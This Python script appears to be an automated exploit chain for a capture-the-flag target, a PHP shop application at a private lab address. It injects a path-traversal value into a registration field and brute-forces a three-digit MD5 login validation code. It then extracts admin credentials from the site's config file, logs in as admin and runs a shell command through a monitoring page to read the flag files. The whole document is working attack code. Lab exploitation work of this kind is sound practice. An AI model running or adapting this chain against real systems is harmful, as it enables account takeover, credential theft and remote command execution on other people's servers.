import hashlib
import requests
import re
from bs4 import BeautifulSoup

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

def register_user(email, url, password):
    path = "/registration.php"
    data = {
        "cust_name": "../admin/inc/config.php",
        "cust_cname": "exploit",
        "cust_email": email, 
        "cust_phone": "1234567890", 
        "cust_address": "111", 
        "cust_country": "4", 
        "cust_city": "sss", 
        "cust_state": "sss", 
        "cust_zip": "sss", 
        "cust_password": password, 
        "cust_re_password": password, 
        "form1": "Register"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    code = requests.post(url + path, headers=headers, data=data, proxies=proxies).status_code
    return code

def login_user(email, validation_code, url, password):
    path = "/login.php"
    data = {
        "cust_email": email, 
        "cust_password": password, 
        "cust_validation_code": validation_code, 
        "form1": "Submit"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url + path, headers=headers, data=data, proxies=proxies, allow_redirects=False)
    return response

def brute_force_validation_code(cust_email, md5_val, base_url, password):
    results = []
    for n in range(1000):
        suffix = f'{n:03d}'  # 生成三位数后缀，前面补0
        md5_val = hashlib.md5((cust_email + suffix).encode()).hexdigest()
        results.append((suffix, md5_val))

    for suffix, md5_val in results:
        status_code_login = login_user(cust_email, md5_val, base_url, password)
        if status_code_login.status_code == 302:
            cookie = {"PHPSESSID": status_code_login.cookies.get('PHPSESSID')}
            print(f"Login succeeded with validation code: {md5_val}, cookie: {cookie}")
            return cookie
    return None

def get_admin_config(user_cookie, base_url):
    path = "/export-orders.php"
    res = requests.get(base_url + path, cookies=user_cookie, proxies=proxies).text
    email = re.search(r'define\("ADMIN_EMAIL",\s*"([^"]+)"\)', res).group(1)
    password = re.search(r'define\("ADMIN_PASSWORD",\s*"([^"]+)"\)', res).group(1)
    return email, password

def login_admin(admin_email, admin_password, base_url):
    path = "/admin/login.php"
    data = {
        "email": admin_email,
        "password": admin_password,
        "form1": "Log+In"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(base_url + path, headers=headers, data=data, proxies=proxies, allow_redirects=False)
    if response.status_code == 302:
        admin_cookie = {"PHPSESSID": response.cookies.get('PHPSESSID')}
        print(f"Admin login succeeded, cookie: {admin_cookie}")
        # 第一个flag
        html = requests.get(base_url + "/admin/index.php", cookies=admin_cookie, proxies=proxies).text
        soup = BeautifulSoup(html, 'html.parser')
        h1_text = soup.select_one('section.content-header h1').get_text(strip=True)
        print(f"First flag found: {h1_text}")
        return admin_cookie
    else:
        print("Admin login failed.")
        exit(1)

def get_root_flag(admin_cookie, base_url):
    path = "/admin/monitor.php"
    data = {"command": "cat ../proof.txt"}
    html = requests.post(base_url + path, cookies=admin_cookie, proxies=proxies, data=data).text
    soup = BeautifulSoup(html, 'html.parser')
    flag = soup.select_one('h2:-soup-contains("Command Output:") + pre').get_text(strip=True)
    print(f"Root flag found: {flag}")
    exit(0)

if __name__ == "__main__":
    cust_email = 'test22@example.com'
    base_url = "http://192.168.152.232:80"
    password = "password123"

    status_code_register = register_user(cust_email, base_url, password)

    if status_code_register != 200:
        print(f"Registration failed with status code: {status_code_register}")
        exit(1)
    else:
        print(f"Registration succeeded and start bruting md5 validation_code...")
        user_cookie = brute_force_validation_code(cust_email, "", base_url, password)
        if user_cookie:
            print(f"Brute-force succeeded: {user_cookie}")
            admin_email, admin_password = get_admin_config(user_cookie, base_url)
            print(f"Admin Email: {admin_email}, Admin Password: {admin_password}")
            print("Logging in as admin...")
            admin_cookie = login_admin(admin_email, admin_password, base_url)
            print("Retrieving root flag...")
            get_root_flag(admin_cookie, base_url)
        else:
            print("Brute-force failed: No valid validation code found.")
